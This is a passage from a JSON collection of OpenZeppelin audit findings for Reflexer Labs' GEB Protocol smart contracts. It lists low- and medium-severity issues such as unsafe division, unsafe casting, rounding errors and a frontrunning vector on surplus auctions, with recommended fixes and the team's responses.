[`GlobalSettlement.prepareCoinsForRedeeming`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L364).\n* [`GlobalSettlement.processSAFE`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L304).\n* [`GlobalSettlement.redeemCollateral`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L370).\n* [`GlobalSettlement.setOutstandingCoinSupply`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L343).\n* [`GlobalSettlement.shudownSystem`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L254).\n* [`TaxCollector.taxSingleOutcome`](https://github.com/reflexer-labs/geb/blob/072f00ebd61a6704d7de66fea688479ed97628c3/src/TaxCollector.sol#L441) lacks explanation for its output parameters.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/v0.6.7/natspec-format.html) (NatSpec).\n\n\n***Update:** Acknowledged, not fixed. Reflexer Labs’ statement for this issue:*\n\n\n\n> \n>  We will have to delay this but we will take care of it.\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11214",
      "title": "[L07] Collateral is assumed to be 18 decimals",
      "impact": "LOW",
      "content": "In the `BasicCollateralJoin` contract, it is [assumed that the collateral token has 18 decimals](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/BasicTokenAdapters.sol#L116-L117), however there is no check in the adapter to ensure this.\n\n\nTo enforce this condition, consider adding a `require` statement in the constructor after [line 103](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/BasicTokenAdapters.sol#L103) which verifies that `decimals == 18`.\n\n\n***Update:** Fixed in [pull request #84.](https://github.com/reflexer-labs/geb/pull/84/commits/30e70b3d0167b1738ddf14cf000582e1cb5c4c00)*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11213",
      "title": "[L06] Missing error messages in require statements",
      "impact": "LOW",
      "content": "In the code base there are many places where `require` statements are correctly followed by their error messages, clarifying what was the triggered exception. However, there are places in the code where `require` statements are not followed by the corresponding error messages.\n\n\nThis happens frequently in the internal arithmetic functions such as the one in the [`LiquidationEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/LiquidationEngine.sol#L187-201) or in the [`StabilityFeeTreasury`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/StabilityFeeTreasury.sol#L131-L155) contract. If any of those require statements fails  \n\nthe checked condition, the transaction will revert silently with no informative error message.\n\n\nThe mentioned examples are just a few of the total present in the code base.\n\n\nConsider including specific and informative error messages in all `require` statements.\n\n\n***Update:** Fixed in [pull request #83.](https://github.com/reflexer-labs/geb/pull/83/files)*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11212",
      "title": "[L05] Lack of indexed parameters in events",
      "impact": "LOW",
      "content": "In the codebase, almost all event definitions are lacking indexed parameters.\n\n\nThere are several contracts that, in some cases, correctly make use of indexed parameters, like the `Coin` contract that has [two events](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/Coin.sol#L57-L58) using the `index` keyword, or `CollateralAuctionHouse`, which has indexed parameters in the `StartAuction` event, both in the [`EnglishCollateralAuctionHouse`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L111) and in the [`FixedDiscountCollateralAuctionHouse`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L438) contracts.\n\n\nHowever, there are a few places in the codebase where indexed event parameters are used. Contracts like the [`AccountingEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol) or the [`SurplusAuctionHouse`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SurplusAuctionHouse.sol) completely lack them.\n\n\nConsider reviewing all events in the codebase to index parameters. Indexed parameters assist off-chain services (like applications and user interfaces) in searching and filtering for specific events.\n\n\n***Update:** Fixed in [pull request #82.](https://github.com/reflexer-labs/geb/pull/82/files)*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11211",
      "title": "[L04] ERC20 token decimals should be of uint8 type",
      "impact": "LOW",
      "content": "The [ERC20 specification](https://eips.ethereum.org/EIPS/eip-20#decimals) defines the token’s `decimals` to be a `uint8` type. While the [`Coin` token implements this correctly](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/Coin.sol#L44), for consistency, consider changing the type of the variable `decimals` in [`BasicCollateralJoin`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/BasicTokenAdapters.sol#L86), [`ETHJoin`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/BasicTokenAdapters.sol#L178) and [`CoinJoin`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/BasicTokenAdapters.sol#L258) contracts from `uint` to `uint8`.\n\n\n***Update:** Acknlowledged, not fixed. Reflexer Labs’ statement for this issue:*\n\n\n\n> \n>  For now we would like to stick to `uint`\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11210",
      "title": "[L03] Declare uint as uint256 and int as int256",
      "impact": "LOW",
      "content": "To favor explicitness, all instances of `uint` should be declared as `uint256` and all instances of `int` should be declared as `int256`.\n\n\n***Update:** Partially fixed in [pull request #81](https://github.com/reflexer-labs/geb/pull/81/files). Two instances of non-explicit `uint` or `int` types were found on [`AccountingEngine` line 134 (`uint rad`)](https://github.com/reflexer-labs/geb/blob/12bef8c985f9d072ac760a6fa4a8c06cb81ed707/src/AccountingEngine.sol#L134) and [`CollateralAuctionHouse` line 607 (`uint(systemCoinPriceFeedValue)`)](https://github.com/reflexer-labs/geb/blob/12bef8c985f9d072ac760a6fa4a8c06cb81ed707/src/CollateralAuctionHouse.sol#L607).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11209",
      "title": "[L02] contractEnabled should be a bool",
      "impact": "LOW",
      "content": "The variable `contractEnabled` is declared in many contracts as a `uint` value, for example [within the `BasicTokenAdapters`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/BasicTokenAdapters.sol#L88) or the [`SAFEEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SAFEEngine.sol#L116) contracts. Whenever its value is set, it is always set to a `1` or `0` value. Furthermore, whenever it is checked, it is always checked for strict equality to either `0` (like within the [`AccountingEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L325) contract) or `1` (also within the [`AccountingEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L55) contract).\n\n\nSince a `uint` can contain many values besides `0` or `1`, if somehow any one of the `contractEnabled` values is set greater than `1`, all strict equality checks on `contractEnabled` will fail.\n\n\nIf this variable is intended to have only two possible values, consider changing the declarations of `contractEnabled` so that they are `bool`s. This is the intended type for such a situation, and will prevent accidentally setting `contractEnabled` to anything other than the two intended values.\n\n\n***Update:** Acknowledged, not fixed. Reflexer Labs’ statement for this issue:*\n\n\n\n> \n>  We would like to stick to the same logic inherited from MCD\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11208",
      "title": "[L01] Constant HUNDRED declared twice with different values",
      "impact": "LOW",
      "content": "The constant HUNDRED is assigned the value `10**2` in [StabilityFeeTreasury](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/StabilityFeeTreasury.sol#L128) and the value `10**29` in [TaxCollector](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/TaxCollector.sol#L172).\n\n\nTo avoid confusion for future developers, consider re-naming one of the two instances to something else.\n\n\n***Update:** Fixed in [pull request #78.](https://github.com/reflexer-labs/geb/pull/78/files)*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11207",
      "title": "[M09] WAD incorrectly used for rounding",
      "impact": "MEDIUM",
      "content": "Within [`CollateralAuctionHouse`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol), if the amount being bid in a collateral auction [exceeds the `remainingToRaise`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L805) amount, the bid [will be set to the equivalent of `remainingToRaise`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L806). Since `remainingToRaise` is in `RAD` form (scaled by `1e45`), it must be divided by `RAY` (`1e27`) to be in proper `WAD` form. This [division](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L806) results in truncation, where any result will be rounded down to the nearest integer value. However, since this value is the amount being paid into the system, it should be rounded up, to disallow users from paying less than they should. [`WAD` is added](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L806) after the division to counteract truncation losses, but `1` should be added.\n\n\nConsider replacing `WAD` with `1` on [line 806 of `CollateralAuctionHouse`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L806).\n\n\n***Update:** Fixed in [commit `02b2db5a85ed763deb436ad548e636c9efad1cde`.](https://github.com/reflexer-labs/geb/commit/02b2db5a85ed763deb436ad548e636c9efad1cde)*",
      "summary": "\nA bug has been identified in the `CollateralAuctionHouse` source code, where the amount being bid in a collateral auction is set to the equivalent of the `remainingToRaise` amount. The `remainingToRaise` is in `RAD` form (scaled by `1e45`), and it must be divided by `RAY` (`1e27`) to be in proper `WAD` form. This division results in truncation, where any result will be rounded down to the nearest integer value. This is an issue because the value is the amount being paid into the system, and it should be rounded up to disallow users from paying less than they should. To fix this, the `WAD` should be replaced with `1` on line 806 of the `CollateralAuctionHouse` source code. This bug has since been fixed in the `02b2db5a85ed763deb436ad548e636c9efad1cde` commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11206",
      "title": "[M08] Not using SafeMath functions",
      "impact": "MEDIUM",
      "content": "There are several places in the code base where regular Solidity arithmetic operators are used. For example:\n\n\n* In [line 298 of the `GlobalSettlement` contract](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L298) `/` is used.\n* In [line 196 of the `Coin` contract](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/Coin.sol#L196) `++` is used.\n* In [line 565 of the `TaxCollector` contract](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/TaxCollector.sol#L565) `/` is used.\n\n\nThese operators do not protect against overflows, underflows or division by `0` and may silently fail or return unexpected values.  \n\nConsider always performing arithmetic operations with functions that protect the code from such scenarios, like the [math libraries of OpenZeppelin contracts](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/release-v3.2.0/contracts/math).\n\n\n***Update:** Acknowledged, and will not fix. Reflexer Labs’ statement for this issue:*\n\n\n\n> \n>  We understand the concern although we would like to stick to the same functions used in MCD\n> \n> \n>",
      "summary": "\nThis bug report discusses the use of regular Solidity arithmetic operators in the code base of the Reflexer Labs' project, GEB. These operators can fail silently or return unexpected values, and do not protect against overflows, underflows, or division by 0. To prevent these issues, the OpenZeppelin math library functions should be used instead. The Reflexer Labs team has acknowledged the concern but will not fix it, as they would like to stick to the same functions used in MCD.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11205",
      "title": "[M07] Unsafe division in rdivide and wdivide functions",
      "impact": "MEDIUM",
      "content": "The function [`rdivide` on line 227](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L227) and the function [`wdivide` on line 230](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L230) of the `GlobalSettlement` contract, accept the divisor `y` as an input parameter. However, these functions do not check if the value of `y` is `0`. If that is the case, the call will revert due to the division by zero error.\n\n\nOther occurrences of unsafe division functions are:\n\n\n* [`rdivide`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L150), [`rdivide`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L482) and [`wdivide`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L485) in the `CollateralAuctionHouse` contract.\n* [`rdivide`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/OracleRelayer.sol#L132) in the `OracleRelayer` contract.\n\n\nTo prevent such unsafe calculations, consider adding a require statement in the functions to ensure `y &gt; 0`, or consider using the `div` functions provided in OpenZeppelin’s [`SafeMath`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ae69ecaf014beac078b4c21da8a83cf005713469/contracts/math/SafeMath.sol#L103) libraries.\n\n\n***Update:** Fixed in [pull request #77.](https://github.com/reflexer-labs/geb/pull/77/files)*",
      "summary": "\nThis bug report is about the `GlobalSettlement` contract and the `CollateralAuctionHouse` and `OracleRelayer` contracts, all part of the same project. The bug is that these contracts have functions that accept a divisor `y` as an input parameter, but do not check if the value of `y` is `0`. If `y` is 0, the call will revert due to the division by zero error.\n\nTo prevent this issue, it is suggested to add a require statement in the functions to ensure `y` is greater than 0, or to use the `div` functions provided in OpenZeppelin’s `SafeMath` libraries. This bug has now been fixed in pull request #77.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11204",
      "title": "[M06] Unsafe casting",
      "impact": "MEDIUM",
      "content": "In [line 554 of the `TaxCollector`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/TaxCollector.sol#L554) contract, the value of [`coinBalance(receiver)` is an `uint`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SAFEEngine.sol#L103). This is cast to an `int` and then negated. However, since `uint` can store higher values than `int`, it is possible that casting from `uint` to `int` may create an overflow.\n\n\nConsider verifying that the value of `coinBalance(receiver)` is within the acceptable range for negative `int` values before casting and negating. Consider using OpenZeppelin’s [`SafeCast`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/utils/SafeCast.sol) contract, which provides functions for safely casting between types.\n\n\n***Update:** Fixed in [pull request #76.](https://github.com/reflexer-labs/geb/pull/76/commits/3bd01713bc0497e77741b13694199529639a2d59)*",
      "summary": "\nThis bug report is about a potential overflow issue in the `TaxCollector` contract. On line 554, the value of `coinBalance(receiver)` is an `uint` but is cast to an `int` and then negated. Since `uint` can store higher values than `int`, it is possible that casting from `uint` to `int` may create an overflow. To fix this issue, the value of `coinBalance(receiver)` should be verified to be within the acceptable range for negative `int` values before casting and negating. Alternatively, the OpenZeppelin's `SafeCast` contract can be used to safely cast between types. This bug has been fixed in pull request #76.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11203",
      "title": "[M05] Unnecessary input parameters",
      "impact": "MEDIUM",
      "content": "In some functions, input parameters have only one acceptable value. If the input parameter does not have this value, the function call will revert.\n\n\nFor example, in [`SuplusAuctionHouse.increaseBidSize`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SurplusAuctionHouse.sol#L379), the input parameter [`amountToBuy`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SurplusAuctionHouse.sol#L379) is needed. However, a [strict equality to `bids[id].amountToSell` is required](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SurplusAuctionHouse.sol#L384).\n\n\nAdditionally, in [`StabilityFeeTreasury.pullFunds`](https://github.com/reflexer-labs/geb/blob/072f00ebd61a6704d7de66fea688479ed97628c3/src/StabilityFeeTreasury.sol#L287), the `token` parameter is [required to be equal to `systemCoin`](https://github.com/reflexer-labs/geb/blob/072f00ebd61a6704d7de66fea688479ed97628c3/src/StabilityFeeTreasury.sol#L293).\n\n\n[`SurplusAuctionHouse.startAuction`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SurplusAuctionHouse.sol#L154) has the input parameter `initialBid`, but this is always `0` when the function is called from other parts of the code.\n\n\nConsider removing these unnecessary input parameters, and instead enforcing these strict equalities within the function’s logic. This will improve user experience for publicly callable functions by lowering the likelihood of a transaction to revert, and simplifying the user interface. This will also assist auditors and future developers in understanding the intent of the code. If these input parameters are desired to be kept, consider explaining why in the docstrings for the function.\n\n\n***Update:** Acknowledged, and will not fix. Reflexer Labs’ statement for this issue:*\n\n\n\n> \n>  Maker wanted a general interface for `increaseBidSize` and `startAuction` because they’re probably thinking about the future where the implementation may evolve so we’d like to keep them as they are right now. As for `StabilityFeeTreasury.pullFunds` we want to keep token because the `pullFunds(address dstAccount, address token, uint256 wad)` signature will be used in a second iteration of a treasury that can handle any type of token. This way we keep a shared interface.\n> \n> \n>",
      "summary": "\nThis bug report is about functions in the Reflexer Labs' codebase that have input parameters that have only one acceptable value. If the input parameter does not have this value, the function call will revert. For example, the `SurplusAuctionHouse.increaseBidSize` function requires the `amountToBuy` parameter to have a strict equality to `bids[id].amountToSell`. Another example is the `StabilityFeeTreasury.pullFunds` function, which requires the `token` parameter to be equal to `systemCoin`. Furthermore, the `SurplusAuctionHouse.startAuction` function has an input parameter `initialBid` that is always `0` when the function is called from other parts of the code.\n\nThe bug report suggests that these unnecessary input parameters should be removed and the strict equalities should be enforced within the function’s logic. This would improve user experience by lowering the likelihood of a transaction to revert and simplifying the user interface. It would also help auditors and future developers understand the intent of the code. If the input parameters are desired to be kept, the report suggests explaining why in the docstrings for the function. \n\nReflexer Labs acknowledged the bug report but will not fix it. Their statement is that Maker wanted a general interface for `increaseBidSize` and `startAuction` so that the implementation can evolve in the future, and they want to keep the `pullFunds(address dstAccount, address token, uint256 wad)` signature for a second iteration of a treasury that can handle any type of token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11202",
      "title": "[M04] Starting surplus auctions can be prevented",
      "impact": "MEDIUM",
      "content": "Accumulated surplus of reflex indexes can be auctioned to retrieve protocol tokens to be burned. This happens in the [`auctionSurplus()`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L275) function of the `AccountingEngine` contract.\n\n\nThe code uses a queue of debt blocks to handle debt, where new debt is always pushed into the queue and it is processed in blocks that are popped out from the queue. This is done to provide some delay in which the contract can accumulate eventual surplus which can be used to settle such debt.\n\n\nIn [line 286](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L286) of the `auctionSurplus()` function, the code is checking whether the contract has some unactioned and unqueued debt. If the contract actually has an `unqueuedUnauctionedDebt() != 0` it should use the surplus to settle that debt completely or partially.\n\n\nThe problem resides in the fact that any call to the `auctionSurplus()` function can be frontrun and forced to fail by popping a debt block out of the queue and reverting the check in line 286. This can be done by an attacker by calling the [`popDebtFromQueue()`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L222) function in the `AccountingEngine` contract.\n\n\nAn attacker can conduct this attack several times with the limit given by the size of the queue itself. In this sense the potential attack can’t last forever, thereby reducing the severity of this issue. By doing this, an attacker can freeze surplus auctions and influence the system’s operation.\n\n\nAn easy solution would be to call the `settleDebt()` function at the beginning of the `auctionSurplus()` so that any unqueued and unauctioned debt can be settled before sending any surplus to the auction contract. This would also eliminate the attack vector and safeguard system operations.\n\n\nConsidering calling `settleDebt()` inside `auctionSurplus()` before checking that the unqueued and unauctioned debt is zero.\n\n\n***Update:** Fixed in [pull request #79](https://github.com/reflexer-labs/geb/pull/79/files). Upon review, the OpenZeppelin team noticed that a similar vector for frontrunning is calling the [`updateAccumulatedRate`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CoinSavingsAccount.sol#L186) function of `CoinSavingsAccount`, which [increases the debt balance of `AccountingEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CoinSavingsAccount.sol#L192). This is also mitigated by the fix from [pull request #79.](https://github.com/reflexer-labs/geb/pull/79/files)*",
      "summary": "\nThis bug report is regarding the `AccountingEngine` contract of the reflexer-labs/geb repository. The `auctionSurplus()` function is used to auction off accumulated surplus of reflex indexes to retrieve protocol tokens to be burned. The code uses a queue of debt blocks to handle debt, where new debt is always pushed into the queue and it is processed in blocks that are popped out from the queue. However, an attacker can call the `popDebtFromQueue()` function in the `AccountingEngine` contract to frontrun and force the `auctionSurplus()` function to fail. This can be done several times with the limit given by the size of the queue itself, thereby freezing surplus auctions and influencing the system’s operation. To fix this, the `settleDebt()` function should be called at the beginning of the `auctionSurplus()` so that any unqueued and unauctioned debt can be settled before sending any surplus to the auction contract. This would eliminate the attack vector and safeguard system operations. This issue has been fixed in the pull request #79. Additionally, the OpenZeppelin team noticed a similar vector for frontrunning in the `updateAccumulatedRate` function of `CoinSavingsAccount`, which is also mitigated by the fix from pull request #79.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11201",
      "title": "[M03] Too high totalAuctionLength prevents settling of fixed-discount collateral auctions",
      "impact": "MEDIUM",
      "content": "Within [`FixedDiscountCollateralAuctionHouse`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L352), the variable [`totalAuctionLength` is initialized with a value of 10 years](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L408). This value is used at the start of an auction [to determine the auction’s deadline](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L687).\n\n\nWe understand that `totalAuctionLength` does not have the same meaning in fixed-discount auctions as it has in the english auction, since a fixed-discount auction can be completed using flash loans in one single transaction, thereby speeding up the duration of the auction. Having a deadline far in the future [prevents a fixed-discount auction from settling](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L853).\n\n\nMoreover, the [`settleAuction`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L850) function is performing the same operations as [lines 839-843 of the `buyCollateral`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L839-L843) function.\n\n\nIf the `settleAuction` function is needed in any circumstance other than when all collateral has been sold, as in the `buyCollateral` function, consider giving a proper value to `totalAuctionLength`, so it can be called in a more reasonable timeframe. Note that the `settleAuction` function is declared as `external` and can be called by anyone when `now` is greater than the deadline.\n\n\n***Update:** Fixed in [commit `c582fb57c746e36ed6f43ca80a7816e751c0ae2d`](https://github.com/reflexer-labs/geb/commit/c582fb57c746e36ed6f43ca80a7816e751c0ae2d). The Reflexer Labs team has removed functionality from the `settleAuction` function within `FixedDiscountCollateralAuction` and made `totalAuctionLength` and `auctionDeadline` obsolete for fixed discount auctions.*",
      "summary": "\nThis bug report is about the variable `totalAuctionLength` in the `FixedDiscountCollateralAuctionHouse` code. This variable is used to determine the deadline of an auction and was initially set to 10 years. However, this long time frame is not suitable for fixed-discount auctions, as they can be completed in one single transaction and thus don't need such a long deadline. The `settleAuction` function was also performing the same operations as the `buyCollateral` function. The Reflexer Labs team has since fixed this bug by removing the `totalAuctionLength` and `auctionDeadline` functionality for fixed-discount auctions in the commit `c582fb57c746e36ed6f43ca80a7816e751c0ae2d`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11200",
      "title": "[M02] English auction bidder can win with low bidAmount on network congestion",
      "impact": "MEDIUM",
